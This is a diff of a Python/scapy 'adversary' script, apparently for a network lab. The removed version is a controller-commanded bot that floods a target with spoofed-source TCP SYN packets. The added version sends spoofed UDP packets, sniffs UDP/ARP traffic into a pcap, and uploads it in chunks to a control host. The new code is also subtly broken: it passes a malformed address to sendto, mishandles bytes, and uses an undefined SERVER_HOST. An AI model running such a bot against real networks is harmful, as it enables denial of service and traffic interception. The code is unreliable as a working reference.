@@ -1,94 +1,130 @@
-# adversary.py
-from scapy.all import IP, TCP, send
+from scapy.all import IP, UDP, send, sniff, wrpcap
 import socket
 import threading
 import random
+import string
 import time
 import json
+import uuid
 
-# --- Configuration ---
-# IP of the machine running the controller script
-CONTROL_HOST = "127.0.0.1" 
-CONTROL_PORT = 9000
+CONTROL_HOST = "10.10.0.1:9000"
 
-# The target for the spoofed packets
-TARGET_IP = "10.10.0.2"
-TARGET_PORT = 8080
-# --- End Configuration ---
+TARGET_SERVER_IP = "10.10.0.2"
+TARGET_SERVER_PORT = 8080
 
-# Global flag to control the attack thread's state
-running = False
+CLIENT_PORT = 10000
+CLIENT_ID = str(uuid.uuid4())
 
-def spoof_attack():
-    """
-    This function runs in a separate thread. When the 'running' flag is True,
-    it continuously sends spoofed TCP SYN packets to the target.
-    """
-    while True:
-        if running:
-            # --- IP Spoofing Core Logic ---
-            # 1. Generate a fake (spoofed) source IP address.
-            # This makes the packet appear to come from a random machine on the network.
-            spoof_ip = f"10.10.1.{random.randint(2, 254)}"
-            
-            # 2. Craft the raw packet using Scapy.
-            # We create an IP header with the *spoofed* source IP and the real target IP.
-            # We then add a TCP header for a SYN packet (flags="S") to initiate a connection.
-            # The target will send its reply (SYN-ACK) to the fake 'spoof_ip', which will go nowhere.
-            packet = IP(src=spoof_ip, dst=TARGET_IP) / TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="S")
-            
-            # 3. Send the packet without printing Scapy's default output.
-            send(packet, verbose=False)
-            
-            print(f"[*] Sent spoofed packet from {spoof_ip} to {TARGET_IP}:{TARGET_PORT}")
-            time.sleep(1)  # Wait for 1 second before sending the next packet
-        else:
-            # If the attack is stopped, sleep to prevent a high-CPU wait loop
-            time.sleep(1)
+simulating = False
 
-def control_listener():
-    """
-    Listens for commands from the controller to start/stop the attack.
-    """
-    global running
+def random_string(n=8):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
+
+def spoof_traffic(sock):
+    global simulating
     
-    # Create a UDP socket to communicate with the controller
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    server_address = (CONTROL_HOST, CONTROL_PORT)
-
-    # Announce presence to the controller by sending a "join" packet
-    join_packet = {"type": "join", "role": "adversary"}
-    sock.sendto(json.dumps(join_packet).encode('utf-8'), server_address)
-    print(f"[*] Adversary node has joined the controller at {CONTROL_HOST}:{CONTROL_PORT}")
-
-    # Listen indefinitely for commands
     while True:
-        try:
-            # Wait to receive data from the controller
-            data, _ = sock.recvfrom(1024) 
-            
-            # Decode the received JSON packet
-            packet = json.loads(data.decode('utf-8'))
-            command = packet.get("type")
+        if simulating:
+            packet = {"type":"traffic", "data":f"{CLIENT_ID}-{random_string()}"}
+            raw_packet = json.dumps(packet)
 
-            # Check the command and update the 'running' state
-            if command == "start" and not running:
-                running = True
-                print("\n[+] Received START command. Adversary attack initiated.")
-            elif command == "stop" and running:
-                running = False
-                print("\n[-] Received STOP command. Adversary attack halted.")
+            rand_ip = random.randint(2, 254)
 
-        except (json.JSONDecodeError, UnicodeDecodeError):
-            print("[!] Warning: Received a malformed packet from the controller.")
-        except Exception as e:
-            print(f"[!] An error occurred in the listener: {e}")
-            break
+            ip = IP(src=f"10.10.1.{rand_ip}", dst=TARGET_SERVER_IP)
+            udp = UDP(sport=CLIENT_PORT, dport=TARGET_SERVER_PORT)
+
+            spoofed_packet = ip / udp / raw_packet
+
+            print("[*] Sending spoofed packet:")
+            spoofed_packet.show()
+
+            send(spoofed_packet)
+
+            wait_time = random.randint(2,4)
+
+            print(f"[*] Sleeping for {wait_time} seconds...")
+
+            time.sleep(random.randint(2,4))
+
+def capture_traffic():
+    global simulating
+    
+    while True:
+        if simulating:
+            packet_filter = "udp or arp"
+
+            packets = sniff(filter=packet_filter, iface="eth0", timeout=30)
+            wrpcap("capture.pcap", packets)
+
+def send_captures(sock):
+    # begin transfer
+    begin_packet = {"type":"data_begin"}
+    raw_begin_packet = json.dumps(begin_packet)
+
+    sock.sendto(raw_begin_packet, CONTROL_HOST)
+
+    # transfer
+    with open("capture.pcap", "rb") as f:
+        while True:
+            chunk = f.read(512)
+
+            if not chunk:
+                break
+
+            packet = {"type":"data_segment","data":chunk}
+            raw_packet = json.dumps(packet)
+
+            sock.sendto(raw_packet, CONTROL_HOST)
+
+            while True:
+                data, addr = sock.recvfrom(1024)
+
+                packet = json.loads(data)
+
+                if packet["type"] == "ack":
+                    break
+
+    # end transfer
+    end_packet = {"type":"data_end"}
+    raw_end_packet = json.dumps(end_packet)
+
+    sock.sendto(raw_end_packet, CONTROL_HOST)
+
+def main():
+    global simulating
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(("0.0.0.0", CLIENT_PORT))
+
+    # join control network
+    packet = {"type":"join", "role":"adversary"}
+    raw_packet = json.dumps(packet)
+
+    sock.sendto(raw_packet, CONTROL_HOST)
+
+    # simulation thread
+    sim_thread = threading.Thread(target=spoof_traffic, args=(sock,), daemon=True)
+    sim_thread.start()
+
+    # capture thread
+    capture_thread = threading.Thread(target=capture_traffic, daemon=True)
+    capture_thread.start()
+
+    while True:
+        data, addr = sock.recvfrom(1024)
+
+        packet = json.loads(data)
+        packet_type = packet["type"]
+
+        if packet_type == "start":
+            simulating = True
+
+            print(f"[*] Started spoofing traffic to {SERVER_HOST}")
+        elif packet_type == "stop":
+            simulating = False
+            send_captures(sock)
+
+            print("[*] Stopped simulating; sent captures to control server")
 
 if __name__ == "__main__":
-    # Start the attack function in a background thread
-    attack_thread = threading.Thread(target=spoof_attack, daemon=True)
-    attack_thread.start()
-
-    # Start the main listener function to wait for controller commands
-    control_listener()
+    main()
